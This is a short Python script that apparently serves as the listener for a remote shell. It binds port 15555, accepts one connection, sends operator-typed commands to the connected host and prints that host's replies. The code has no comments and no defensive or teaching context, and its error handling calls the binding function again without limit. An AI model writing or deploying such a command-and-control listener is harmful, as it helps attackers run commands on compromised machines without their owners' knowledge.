import socket

host = ''
port = 15555

s = socket.socket()

def close():
    
    try:
        
        s.bind((host, port))

        s.listen(5)

    except:
    
        print('error connecting')
    
        close()

def accept():
    
    print('waiting...')

    connecting,adres = s.accept()

    print("connected  IP    ",adres[0],"   PORT   ",adres[1])

    command_send(connecting)

    connecting.close()

def command_send(connecting):

    while True:

        cmd = input('what is code: ')

        if cmd == 'quit':
            connecting.send('a'.encode('utf-8'))
            break

        if len(cmd) > 0:

            connecting.send(cmd.encode('utf-8'))

            answer = connecting.recv(4096).decode('utf-8')

            print(answer)


close()
accept()